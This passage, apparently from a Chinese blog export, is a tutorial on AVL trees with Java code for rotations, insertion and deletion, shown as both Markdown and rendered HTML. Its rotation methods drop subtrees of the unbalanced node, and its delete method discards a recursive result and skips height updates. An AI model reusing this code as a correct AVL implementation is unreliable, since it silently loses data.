node.left;\n    //2.将失衡节点下降\n    newNode.right = new Node(node.elment);\n    //调整高度值\n    newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;\n    return newNode;\n}\n```\n\n\n此时，失衡节点的左子节点的右子节点还未处理,将该右子节点作为失衡节点左节点改变代码为:\n```\n//右旋\nprivate Node nodeLL(Node node){\n    //1.将失衡节点的左节点提升\n    Node newNode = node.left;\n    //2.将失衡节点下降\n    newNode.right = new Node(node.elment);\n    //3.失衡节点的左子节点的右子节点处理\n    newNode.right.left = node.left.right;\n    //调整高度值\n    newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;\n    return newNode;\n}\n```\n\n如图:\n![LL3](http://67.216.218.49:8000/file/blogs/algorithm/avl_tree_LL_03.png)\n\n当失衡节点的左子节点的右子节点 不存在， 即为null,时，这样处理无影响。此时就和插入的平衡处理一个效果。\n\n- RR\n\n参照 LL, RR进行左旋操作\n\n```\n//左旋\nprivate Node nodeRR(Node node){\n    //1.将失衡节点的右子节点提升\n    Node newNode = node.right;\n    //2.将失衡节点下沉\n    newNode.left = new Node(node.elment);\n    //3.失衡节点的右节点的左孩子处理\n    newNode.left.right = node.right.left;\n    //调整高度\n    newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;\n    return newNode;\n}\n```\n\n\n此时，插入和删除的代码可以合并.\n\n#### (3)性能\n\n- 查找\n\nO(logn).\n\n- 插入\n\nO(logn) + 旋转。\n\n插入时，最多需要旋转1次(单旋转或双旋转).\n\n- 删除\n\nO(logn) + 旋转.\n\n删除之后必须检查从删除结点开始到根结点路径上的所有结点的平衡因子。每一次删除操作最多需要O(logN)次旋转。因此，删除操作的时间复杂度为O(logN)+O(logN)=O(2logN)\n\n\n### 3.完整代码\n\n```\npublic class MyTest {\n\n\n    private static class Node<E>{\n        E elment;\n        Node<E> left;\n        Node<E> right;\n        int height;\n\n        Node(E elment){\n            this(elment, null, null);\n        }\n        Node(E elment, Node left, Node right){\n            this.elment = elment;\n            this.left = left;\n            this.right = right;\n        }\n\n    }\n\n    private static class AVLTree<E extends Comparable<? super E>>{\n        Node root;\n\n        public AVLTree(){\n            this.root = null;\n        }\n        public void insert(E elment){\n            this.root = insert(this.root, elment);\n        }\n\n        public void delete(E elment){\n            if (elment != null){\n                this.root = delete(this.root, elment);\n            }\n        }\n\n        //递归找到要插入的位置插入，同时在return中平衡高度\n        public Node insert(Node<E> root, E elemet){\n            if( root == null ){\n                return new Node(elemet);\n            }\n\n            if(elemet.compareTo(root.elment) < 0 ){\n                //左边插入\n                root.left = insert(root.left, elemet);\n                //在return后平衡高度,因为是在左边插入，所以如果高度不平衡，只会是左边高于右边\n                if(height(root.left) - height(root.right) == 2){\n                    //判断是插在子节点的左边还是右边\n                    if(elemet.compareTo(root.left.elment) < 0){\n                        //LL\n                        root = nodeLL(root);\n                    }else {\n                        //LR\n                        root = nodeLR(root);\n                    }\n                }\n\n            }else if(elemet.compareTo(root.elment) > 0){\n                //右边插入\n                root.right = insert(root.right, elemet);\n                //在return后平衡高度,因为是在右边插入，所以如果高度不平衡，只会是右边高于左边\n                if(height(root.right) - height(root.left) == 2){\n                    //判断是插在子节点的左边还是右边\n                    if(elemet.compareTo(root.right.elment) < 0){\n                        //RL\n                        root = nodeRL(root);\n                    }else {\n                        //RR\n                        root = nodeRR(root);\n                    }\n                }\n            }\n\n            //更新节点高度\n            root.height = Math.max(height(root.left),height(root.right)) + 1;\n            return root;\n        }\n\n        //右旋\n        private Node nodeLL(Node node){\n            //1.将失衡节点的左节点提升\n            Node newNode = node.left;\n            //2.将失衡节点下降\n            newNode.right = new Node(node.elment);\n            //3.失衡节点的左子节点的右子节点处理\n            newNode.right.left = node.left.right;\n            //调整高度值\n            newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;\n            return newNode;\n        }\n        //左旋\n        private Node nodeRR(Node node){\n            //1.将失衡节点的右子节点提升\n            Node newNode = node.right;\n            //2.将失衡节点下沉\n            newNode.left = new Node(node.elment);\n            //3.失衡节点的右节点的左孩子处理\n            newNode.left.right = node.right.left;\n            //调整高度\n            newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;\n            return newNode;\n        }\n        //左旋再右旋\n        private Node nodeLR(Node node){\n            Node newNode = node.left.right;\n            newNode.left = new Node(node.left.elment);\n            newNode.right = new Node(node.elment);\n            newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;\n            return newNode;\n        }\n        //右旋再左旋\n        private Node nodeRL(Node node){\n            Node newNode = node.right.left;\n            newNode.left = new Node(node.elment);\n            newNode.right = new Node(node.right.elment);\n            newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;\n            return newNode;\n        }\n\n        private int height(Node node){\n            return node == null ? -1:node.height;\n        }\n\n\n        public Node delete(Node<E> root, E element){\n            if (root == null){\n                return null;\n            }\n\n            if(element.compareTo(root.elment) < 0){\n                //左递归\n                root.left = delete(root.left, element);\n                //重新调整平衡，删除左边，调整右边\n                if(height(root.left) - height(root.right) == 2 || height(root.left) - height(root.right) == -2){\n                    //判断是哪种调整方式\n                    // 只有失衡节点的右子树的左节点\n                    if(root.right.right == null){\n                        //RL\n                        root = nodeRL(root);\n                    }else {\n                        //RR\n                        root = nodeRR(root);\n                    }\n                }\n            }else if(element.compareTo(root.elment) > 0){\n                //右递归\n                root.right = delete(root.right, element);\n                //重新调整平衡，删除右边，调整左边\n                if(height(root.right) - height(root.left) == 2 || height(root.right) - height(root.left) == -2){\n                    //判断调整类型\n                    //只有失衡节点的左子树的右节点\n                    if(root.left.left == null){\n                        //LR\n                        root = nodeLR(root);\n                    }else {\n                        //LL\n                        root = nodeLL(root);\n                    }\n                }\n            }else {\n                //删除\n                if(root.left != null && root.right != null){\n                    //有两个子节点\n                    //找到替换得节点，右子树最小值\n                    root.elment = findElement(root);\n                    //删除替换节点，替换节点一定是叶子节点\n                    delete(root.right, root.elment);\n\n                }else if(root.left == null && root.right == null){\n                    //无子节点，自己是叶子节点\n                    root = null;\n                }else {\n                    //有一个子节点\n                    root = root.left != null ? root.left : root.right;\n                }\n            }\n            return root;\n        }\n\n        //判断替换点为左子树最大还是右子树最小\n        private E findElement(Node<E> root){\n            if(height(root.left) >= height(root.right)){\n                return findLeftMax(root.left);\n            }else {\n                return findRightMin(root.right);\n            }\n        }\n        private E findRightMin(Node<E> root){\n            while (root.left != null){\n                root = root.left;\n            }\n           return root.elment;\n        }\n        private E findLeftMax(Node<E> root){\n            while (root.right != null){\n                root = root.right;\n            }\n            return root.elment;\n        }\n    }\n\n\n    public static void main(String[] args){\n\n        AVLTree tree = new AVLTree();\n        tree.insert(4);\n        tree.insert(2);\n        tree.insert(5);\n        tree.insert(1);\n        tree.insert(3);\n\n\n        System.out.println(tree.root.elment);\n        tree.delete(5);\n        System.out.println(tree.root.elment);\n\n\n    }\n}\n\n```\n","slug":"algorithm/平衡二叉树了解","published":1,"updated":"2019-10-13T12:15:12.168Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321l5003j6dcprqqytab6","content":"<h1 id=\"一-什么是平衡二叉树\"><a href=\"#一-什么是平衡二叉树\" class=\"headerlink\" title=\"一.什么是平衡二叉树\"></a>一.什么是平衡二叉树</h1><p>平衡二叉树也是一种二叉查找树，有以下特点:</p>\n<ul>\n<li>1.可以是空树。</li>\n<li>2.假如不是空树，任何一个结点的左子树与右子树都是平衡二叉树，并且高度之差的绝对值不超过 1 (即高度要平衡)</li>\n</ul>\n<h1 id=\"二-为什么要有平衡二叉树，即优缺点\"><a href=\"#二-为什么要有平衡二叉树，即优缺点\" class=\"headerlink\" title=\"二.为什么要有平衡二叉树，即优缺点\"></a>二.为什么要有平衡二叉树，即优缺点</h1><ul>\n<li>优</li>\n</ul>\n<p>在树这种数据结构中，树的高度影响着查找速度，层数越少，需要查询的次数越少，效率越高。<br>而平衡二叉树，能减少树的高度，防止出现极端O(N)的情况，使效率稳定为O(logN).</p>\n<ul>\n<li>缺</li>\n</ul>\n<p>当数据量越来越大时，为了保证高度平衡，动态插入和删除的代价也随之增加。<br></p>\n<p>在大数据量查找环境下(如数据库记录查找)，在二叉树结构下(2*N -1),N的层会太大，造成硬盘IO读写次数过多。(使用多路查找树).</p>\n<h1 id=\"三-怎么实现\"><a href=\"#三-怎么实现\" class=\"headerlink\" title=\"三.怎么实现\"></a>三.怎么实现</h1><p>AVL树，平衡二叉树的最早实现之一。以下为AVL树的实现.</p>\n<h3 id=\"1-原理\"><a href=\"#1-原理\" class=\"headerlink\" title=\"1.原理\"></a>1.原理</h3><p>因为平衡二叉树比二叉查找树多了一些性质来保证高度平衡.所以在每一次插入数值之后，树的平衡性都可能被破坏，这时可以通过一个简单的操作来矫正平衡––旋转。<br></p>\n<p>旋转的目的就是减少高度，通过降低整棵树的高度来平衡。哪边的树高，就把那边的树向上旋转。</p>\n<p>四种旋转:<br></p>\n<p>旋转是以失衡的节点为基准的<br><br>LL的解释, 第一个L代表根节点左边，第二个L代表插入的为左节点<br></p>\n<ul>\n<li>LL（左子树的左节点上插入节点而破坏平衡）：右旋转</li>\n</ul>\n<p>第一个 L: <strong>左子树</strong> <br><br>第二个 L: 失衡节点的左孩子的 <strong>左节点</strong>.</p>\n<p><img src=\"http://67.216.218.49:8000/file/blogs/algorithm/avl_tree_LL.webp\" alt=\"LL\"></p>\n<ul>\n<li>RR（右子树的右节点上插入节点而破坏平衡）：左旋转</li>\n</ul>\n<p>第一个 R: <strong>右子树</strong> <br><br>第二个 R: 失衡节点的右孩子的 <strong>右节点</strong>.<br><img src=\"http://67.216.218.49:8000/file/blogs/algorithm/avl_tree_RR.webp\" alt=\"RR\"></p>\n<ul>\n<li>LR（左子树的右节点上插入节点而破坏平衡）：先左旋后右旋</li>\n</ul>\n<p>第一个 L: <strong>左子树</strong> <br><br>第二个 R: 失衡节点的左孩子的 <strong>右节点</strong>.<br><img src=\"http://67.216.218.49:8000/file/blogs/algorithm/avl_tree_LR.webp\" alt=\"LR\"></p>\n<ul>\n<li>RL（右子树的左节点上插入节点而破坏平衡）：先右旋后左旋</li>\n</ul>\n<p>第一个 R: <strong>右子树</strong> <br><br>第二个 L: 失衡节点的右孩子的 <strong>左节点</strong>.<br><img src=\"http://67.216.218.49:8000/file/blogs/algorithm/avl_tree_RL.webp\" alt=\"RL\"></p>\n<h3 id=\"2-实现代码\"><a href=\"#2-实现代码\" class=\"headerlink\" title=\"2.实现代码\"></a>2.实现代码</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class MyTest &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    private static class Node&lt;E&gt;&#123;</span><br><span class=\"line\">        E elment;</span><br><span class=\"line\">        Node&lt;E&gt; left;</span><br><span class=\"line\">        Node&lt;E&gt; right;</span><br><span class=\"line\">        int height;</span><br><span class=\"line\"></span><br><span class=\"line\">        Node(E elment)&#123;</span><br><span class=\"line\">            this(elment, null, null);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        Node(E elment, Node left, Node right)&#123;</span><br><span class=\"line\">            this.elment = elment;</span><br><span class=\"line\">            this.left = left;</span><br><span class=\"line\">            this.right = right;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    private static class AVLTree&lt;E extends Comparable&lt;? super E&gt;&gt;&#123;</span><br><span class=\"line\">        Node root;</span><br><span class=\"line\"></span><br><span class=\"line\">        public AVLTree()&#123;</span><br><span class=\"line\">            this.root = null;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        public void insert(E elment)&#123;</span><br><span class=\"line\">            this.root = insert(this.root, elment);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        //递归找到要插入的位置插入，同时在return中平衡高度</span><br><span class=\"line\">        public Node insert(Node&lt;E&gt; root, E elemet)&#123;</span><br><span class=\"line\">            if( root == null )&#123;</span><br><span class=\"line\">                return new Node(elemet);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            if(elemet.compareTo(root.elment) &lt; 0 )&#123;</span><br><span class=\"line\">                //左边插入</span><br><span class=\"line\">                root.left = insert(root.left, elemet);</span><br><span class=\"line\">                //在return后平衡高度,因为是在左边插入，所以如果高度不平衡，只会是左边高于右边</span><br><span class=\"line\">                if(height(root.left) - height(root.right) == 2)&#123;</span><br><span class=\"line\">                    //判断是插在子节点的左边还是右边</span><br><span class=\"line\">                    if(elemet.compareTo(root.left.elment) &lt; 0)&#123;</span><br><span class=\"line\">                        //LL</span><br><span class=\"line\">                        root = nodeLL(root);</span><br><span class=\"line\">                    &#125;else &#123;</span><br><span class=\"line\">                        //LR</span><br><span class=\"line\">                        root = nodeLR(root);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;else if(elemet.compareTo(root.elment) &gt; 0)&#123;</span><br><span class=\"line\">                //右边插入</span><br><span class=\"line\">                root.right = insert(root.right, elemet);</span><br><span class=\"line\">                //在return后平衡高度,因为是在右边插入，所以如果高度不平衡，只会是右边高于左边</span><br><span class=\"line\">                if(height(root.right) - height(root.left) == 2)&#123;</span><br><span class=\"line\">                    //判断是插在子节点的左边还是右边</span><br><span class=\"line\">                    if(elemet.compareTo(root.right.elment) &lt; 0)&#123;</span><br><span class=\"line\">                        //RL</span><br><span class=\"line\">                        root = nodeRL(root);</span><br><span class=\"line\">                    &#125;else &#123;</span><br><span class=\"line\">                        //RR</span><br><span class=\"line\">                        root = nodeRR(root);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            //更新节点高度</span><br><span class=\"line\">            root.height = Math.max(height(root.left),height(root.right)) + 1;</span><br><span class=\"line\">            return root;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        //右旋</span><br><span class=\"line\">        private Node nodeLL(Node node)&#123;</span><br><span class=\"line\">            //旋转</span><br><span class=\"line\">            Node newNode = node.left;</span><br><span class=\"line\">            newNode.right = new Node(node.elment);</span><br><span class=\"line\">            //调整高度值</span><br><span class=\"line\">            newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;</span><br><span class=\"line\">            return newNode;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        //左旋</span><br><span class=\"line\">        private Node nodeRR(Node node)&#123;</span><br><span class=\"line\">            Node newNode = node.right;</span><br><span class=\"line\">            newNode.left = new Node(node.elment);</span><br><span class=\"line\">            newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;</span><br><span class=\"line\">            return newNode;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        //左旋再右旋</span><br><span class=\"line\">        private Node nodeLR(Node node)&#123;</span><br><span class=\"line\">            Node newNode = node.left.right;</span><br><span class=\"line\">            newNode.left = new Node(node.left.elment);</span><br><span class=\"line\">            newNode.right = new Node(node.elment);</span><br><span class=\"line\">            newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;</span><br><span class=\"line\">            return newNode;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        //右旋再左旋</span><br><span class=\"line\">        private Node nodeRL(Node node)&#123;</span><br><span class=\"line\">            Node newNode = node.right.left;</span><br><span class=\"line\">            newNode.left = new Node(node.elment);</span><br><span class=\"line\">            newNode.right = new Node(node.right.elment);</span><br><span class=\"line\">            newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;</span><br><span class=\"line\">            return newNode;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        private int height(Node node)&#123;</span><br><span class=\"line\">            return node == null ? -1:node.height;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        AVLTree tree = new AVLTree();</span><br><span class=\"line\">        tree.insert(5);</span><br><span class=\"line\">        tree.insert(4);</span><br><span class=\"line\">        tree.insert(6);</span><br><span class=\"line\">        tree.insert(3);</span><br><span class=\"line\">        tree.insert(2);</span><br><span class=\"line\"></span><br><span class=\"line\">        System.out.println(tree.root.elment);</span><br><span class=\"line\">        System.out.println(tree.root.left.left.elment);</span><br><span class=\"line\">        System.out.println(tree.root.left.right.elment);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"3-顺着代码来理一下逻辑\"><a href=\"#3-顺着代码来理一下逻辑\" class=\"headerlink\" title=\"3.顺着代码来理一下逻辑\"></a>3.顺着代码来理一下逻辑</h3><p>1.定义节点类Node,其中height记录当前节点的高度，用来判断是否失衡</p>\n<p>2.定义AVL树，其实就一个root节点</p>\n<p>3.提供四种旋转方法，以失衡的节点为参</p>\n<p>4.通过insert() 不断插入来构建一棵AVL树</p>\n<p>主要注意insert(Node<e> root, E elemet)方法.<br>通过递归，找到新节点的插入点，并插入，然后在一层层的返回结果中判断是否失衡，并调整。</e></p>\n<p>如图:<br><br><img src=\"http://67.216.218.49:8000/file/blogs/algorithm/avl_tree_insert1.PNG\" alt=\"insert\"></p>\n<p>已有一棵平衡二叉树，再插入一个节点，节点值为2.<br><br>根据代码，相应流程如下:</p>\n<ul>\n<li>1.递归找到插入点</li>\n<li>2.在return中判断是否打破平衡，并进行调整.</li>\n</ul>\n<p><img src=\"http://67.216.218.49:8000/file/blogs/algorithm/avl_tree_insert2.PNG\" alt=\"insert2\"><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.insert(Node(5), 2);</span><br><span class=\"line\">2.    insert(Node(4), 2);</span><br><span class=\"line\">3.        insert(Node(3), 2);</span><br><span class=\"line\">4.            insert(null, 2);</span><br><span class=\"line\">5.            return Node(2);</span><br><span class=\"line\">6.        Node(3).left = Node(2); return Node(3);</span><br><span class=\"line\">7.    Node(4).left = Node(3); height == 2;</span><br><span class=\"line\">      旋转调整 Node(4) = LL(Node(4)); return Node(4);</span><br><span class=\"line\">8.Node(5).left = Node(4); return Node(5);</span><br><span class=\"line\"></span><br><span class=\"line\">Node(5).right 即根节点的右子树，在本例中无变化</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"四-节点删除操作\"><a href=\"#四-节点删除操作\" class=\"headerlink\" title=\"四.节点删除操作\"></a>四.节点删除操作</h2><p>节点删除分为 删除节点 和 调整平衡两步.</p>\n<h3 id=\"1-删除节点\"><a href=\"#1-删除节点\" class=\"headerlink\" title=\"1.删除节点\"></a>1.删除节点</h3><p>删除节点后 要保证剩下还是一棵二叉查找树(有序)。为了保证此条件，我们对删除的三种情况进行分析。<br></p>\n<ul>\n<li>删除的节点为叶子节点</li>\n</ul>\n<p>此时可以直接删除。</p>\n<ul>\n<li>删除对的节点有一个子节点</li>\n</ul>\n<p>此时，无论是有左子节点还是右子节点，可以直接将要删除的节点直接用子节点进行替换。</p>\n<ul>\n<li>删除的节点有两个子节点</li>\n</ul>\n<p>此时判断下要删除的节点的左右子树高度， 若 height(left) &gt;= height(right), 则取 左子树的最大值节点， 如 height(left) &lt; height(right), 则取 右子树的最小值节点. 同时删除该取值的节点。<br></p>\n<p>不管是最大值还是最小值节点，肯定都是叶子节点。<br></p>\n<h3 id=\"2-调整平衡\"><a href=\"#2-调整平衡\" class=\"headerlink\" title=\"2.调整平衡\"></a>2.调整平衡</h3><h4 id=\"1-情况分析\"><a href=\"#1-情况分析\" class=\"headerlink\" title=\"(1)情况分析\"></a>(1)情况分析</h4><p>不同于插入, 如图:</p>\n<p><img src=\"http://67.216.218.49:8000/file/blogs/algorithm/avl_tree_LL_02.png\" alt=\"LL2\"></p>\n<p>如上图中图一，新增的时候，只会有节点1 和 节点3 中的一个，不可能同时出现两个的情况，因为，当第一个出现时，节点4就已经失衡，进行调整了。<br></p>\n<p>如上图中图二，当删除时，删除节点5， 会出现节点4失衡， 但是会出现 节点1和节点3 同时存在的情况。此时，将失衡类型 归入 LL 里面.<br></p>\n<p>同理，会出现两个子树同时存在的 RR 情况.<br></p>\n<p>在删除时，可能会出现失衡节点的子节点同时有左右子节点情况。所以，在调整平衡时，于插入有点不一样。如下图， 此时将 1，3 作为 LL, 将 2 作为 LR.<br></p>\n<p><img src=\"http://67.216.218.49:8000/file/blogs/algorithm/avl_tree_LL_04.png\" alt=\"LL4\"></p>\n<ul>\n<li>LL：右旋转</li>\n</ul>\n<p>第一个 L: <strong>左子树</strong> <br><br>第二个 L: 失衡节点的左孩子的 <strong>左节点</strong>, <font color=\"#A52A2A\">或 <strong>同时有左右节点</strong> </font>.</p>\n<ul>\n<li>RR：左旋转</li>\n</ul>\n<p>第一个 R: <strong>右子树</strong> <br><br>第二个 R: 失衡节点的右孩子的 <strong>右节点</strong>,<font color=\"#A52A2A\">或 <strong>同时有左右节点</strong> </font>.</p>\n<ul>\n<li>LR：先左旋后右旋</li>\n</ul>\n<p>第一个 L: <strong>左子树</strong> <br><br>第二个 R: 失衡节点的左孩子的 <strong>右节点</strong>.</p>\n<ul>\n<li>RL）：先右旋后左旋</li>\n</ul>\n<p>第一个 R: <strong>右子树</strong> <br><br>第二个 L: 失衡节点的右孩子的 <strong>左节点</strong>.</p>\n<h4 id=\"2-具体变化\"><a href=\"#2-具体变化\" class=\"headerlink\" title=\"(2)具体变化\"></a>(2)具体变化</h4><ul>\n<li>LL</li>\n</ul>\n<p>LL 为右旋， 所以按照右旋的步骤：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//右旋</span><br><span class=\"line\">private Node nodeLL(Node node)&#123;</span><br><span class=\"line\">    //1.将失衡节点的左节点提升</span><br><span class=\"line\">    Node newNode = node.left;</span><br><span class=\"line\">    //2.将失衡节点下降</span><br><span class=\"line\">    newNode.right = new Node(node.elment);</span><br><span class=\"line\">    //调整高度值</span><br><span class=\"line\">    newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;</span><br><span class=\"line\">    return newNode;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>此时，失衡节点的左子节点的右子节点还未处理,将该右子节点作为失衡节点左节点改变代码为:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//右旋</span><br><span class=\"line\">private Node nodeLL(Node node)&#123;</span><br><span class=\"line\">    //1.将失衡节点的左节点提升</span><br><span class=\"line\">    Node newNode = node.left;</span><br><span class=\"line\">    //2.将失衡节点下降</span><br><span class=\"line\">    newNode.right = new Node(node.elment);</span><br><span class=\"line\">    //3.失衡节点的左子节点的右子节点处理</span><br><span class=\"line\">    newNode.right.left = node.left.right;</span><br><span class=\"line\">    //调整高度值</span><br><span class=\"line\">    newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;</span><br><span class=\"line\">    return newNode;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>如图:<br><img src=\"http://67.216.218.49:8000/file/blogs/algorithm/avl_tree_LL_03.png\" alt=\"LL3\"></p>\n<p>当失衡节点的左子节点的右子节点 不存在， 即为null,时，这样处理无影响。此时就和插入的平衡处理一个效果。</p>\n<ul>\n<li>RR</li>\n</ul>\n<p>参照 LL, RR进行左旋操作</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//左旋</span><br><span class=\"line\">private Node nodeRR(Node node)&#123;</span><br><span class=\"line\">    //1.将失衡节点的右子节点提升</span><br><span class=\"line\">    Node newNode = node.right;</span><br><span class=\"line\">    //2.将失衡节点下沉</span><br><span class=\"line\">    newNode.left = new Node(node.elment);</span><br><span class=\"line\">    //3.失衡节点的右节点的左孩子处理</span><br><span class=\"line\">    newNode.left.right = node.right.left;</span><br><span class=\"line\">    //调整高度</span><br><span class=\"line\">    newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;</span><br><span class=\"line\">    return newNode;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>此时，插入和删除的代码可以合并.</p>\n<h4 id=\"3-性能\"><a href=\"#3-性能\" class=\"headerlink\" title=\"(3)性能\"></a>(3)性能</h4><ul>\n<li>查找</li>\n</ul>\n<p>O(logn).</p>\n<ul>\n<li>插入</li>\n</ul>\n<p>O(logn) + 旋转。</p>\n<p>插入时，最多需要旋转1次(单旋转或双旋转).</p>\n<ul>\n<li>删除</li>\n</ul>\n<p>O(logn) + 旋转.</p>\n<p>删除之后必须检查从删除结点开始到根结点路径上的所有结点的平衡因子。每一次删除操作最多需要O(logN)次旋转。因此，删除操作的时间复杂度为O(logN)+O(logN)=O(2logN)</p>\n<h3 id=\"3-完整代码\"><a href=\"#3-完整代码\" class=\"headerlink\" 